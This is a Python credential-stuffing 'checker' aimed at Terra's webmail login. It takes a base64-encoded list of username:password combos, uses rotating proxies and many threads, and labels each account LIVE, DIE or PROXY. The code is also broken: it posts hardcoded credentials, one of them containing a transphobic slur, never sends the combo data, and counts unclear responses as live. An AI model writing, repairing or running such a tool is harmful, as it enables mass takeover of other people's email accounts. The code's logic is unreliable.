import utils
import concurrent.futures
import sys
import base64
import json
import datetime
import traceback
import datetime
import os
from multiprocessing import Lock

lock = Lock()
lives = 0
dies = 0
proxies = 0
email = 'nospher@come.traveco'
senha = 'nospherestouracudetravesti'

def check():
    global lives, dies, proxies

    try:
        lock.acquire()
        account_info = str(arguments['combo'].pop(0)).strip().split(arguments['delimiter'])
        lock.release()
        tries = 0
        while True:
            if tries <= 5:
                try:
                    session = utils.session(proxy=arguments['proxy'], random=arguments['proxy_random'], timeout2=10)
                    data = 'YII_CSRF_TOKEN=c13e1e25c448458648ec0306169bfaac9f5ef4b5&LoginForm%5Busername%5D={email}&LoginForm%5Bpassword%5D={senha}'
                    r = session.post('https://mail.terra.com.br/mail/index.php?r=site/login&format=json')
                    if "Failure" in r:
                        status = 'DIE'
                        dies += 1
                    elif "Success" in r:
                        status = 'LIVE'
                        lives += 1
                    else:
                        status = 'LIVE'
                        lives += 1
                except Exception as e:
                    if 'HTTPSConnectionPool' in str(e):
                        status = 'PROXY'
                        proxies += 1
                    else:
                        utils.log.info('ERROR', 'Contact administration. Level: 03')
                        utils.save.savetofile('errors', {"date": datetime.datetime.now(), "checker": str(__name__), "error": traceback.format_exc()})
                        break
                finally:
                    tries += 1
                    if status != 'PROXY':
                        utils.log.info(status, account_info[0])
                        break
            else:
                utils.log.info('ERROR', 'Contact administration. Level: 02')
                break
    except:
        utils.log.info('ERROR', 'Contact administration. Level: 01')
        utils.save.savetofile('errors', {"date": datetime.datetime.now(), "checker": str(__name__), "error": traceback.format_exc()})

if __name__ == "__main__":
    try:            
        if sys.argv[1]:
            arguments = json.loads(base64.b64decode(f'{sys.argv[1]}==').decode('utf-8'))
            total = len(arguments['combo'])
            threads = int(arguments['threads'])
            utils.log.info('START', { 'total': total, 'threads': threads})
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                [executor.submit(check) for i in range(0, len(arguments['combo']), 1)]
        else: 
            utils.log.info('ERROR', 'Argument not valid.')
    except KeyboardInterrupt:
         pass

utils.log.info('END', { 'total': total, 'lives': lives, 'dies': dies, 'proxies': proxies })